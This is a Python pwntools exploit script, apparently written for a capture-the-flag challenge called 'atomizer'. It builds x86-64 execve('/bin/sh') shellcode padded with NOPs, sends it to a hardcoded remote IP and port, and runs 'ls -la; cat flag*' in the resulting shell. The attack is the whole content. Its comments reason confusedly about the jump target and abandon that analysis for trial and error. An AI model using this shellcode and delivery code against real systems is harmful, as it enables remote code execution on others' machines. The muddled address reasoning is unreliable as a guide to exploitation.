#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# The challenge:
# - mmaps 0x1000 bytes at 0x7770000 with RWX
# - reads up to 69 bytes into 0x7770000
# - if 69 bytes read, jumps to 0x7B71084
#
# Let me recalculate:
# jmp 0x7b71084 from 0x401083 (5-byte instruction)
# 0x7B71084 - 0x7770000 = 0x401084
#
# Wait... the offset 0x84 within a page is interesting.
# Our shellcode starts at 0x7770000, we write 69 bytes (0x45 = 69)
# So we cover 0x7770000 to 0x7770044
#
# The jump target offset 0x84 = 132, which is beyond our 69 bytes!
#
# BUT - what if we look at it differently:
# The jump is "jmp 0x7B71084" but executed from code at 0x401083
# The mmap is at 0x7770000
# 
# Key insight: maybe we need to look at where our shellcode needs to be
# relative to where execution STARTS after the jump.
#
# Actually wait - let me look at 0x7B71084 more carefully
# If this jumps into our buffer, execution starts at offset 0x1084 into mmap?
# No wait, 0x7B71084 - 0x7770000 = 0x401084 - that's way off
#
# Let me try a different approach - just send shellcode and see what happens
# Perhaps there's an off-by-one or the address calculation is different

# Pre-compiled x86-64 Linux execve("/bin/sh") shellcode
# 48 31 f6          xor rsi, rsi
# 56                push rsi  
# 48 bf 2f 62 69 6e 2f 2f 73 68   movabs rdi, 0x68732f2f6e69622f
# 57                push rdi
# 48 89 e7          mov rdi, rsp
# 48 31 d2          xor rdx, rdx
# 6a 3b             push 0x3b
# 58                pop rax
# 0f 05             syscall
shellcode = bytes.fromhex('4831f65648bf2f62696e2f2f7368574889e74831d26a3b580f05')

print(f"Shellcode length: {len(shellcode)}")
print(f"Shellcode hex: {shellcode.hex()}")

# Pad to exactly 69 bytes
payload = shellcode.ljust(69, b'\x90')  # NOP padding

print(f"Payload length: {len(payload)}")

# Test locally first
LOCAL = False # Force remote
if LOCAL:
    #p = process('./atomizer')
    p = remote('52.59.124.14', 5020)
else:
    p = remote('52.59.124.14', 5020)

try:
    p.recvuntil(b'>>> ')
    p.send(payload)
    
    # Check if we got a shell
    p.sendline(b'ls -la; cat flag*')
    # Read response
    print(p.recvall(timeout=2).decode(errors='ignore'))
except Exception as e:
    print(f"Error: {e}")
p.close()
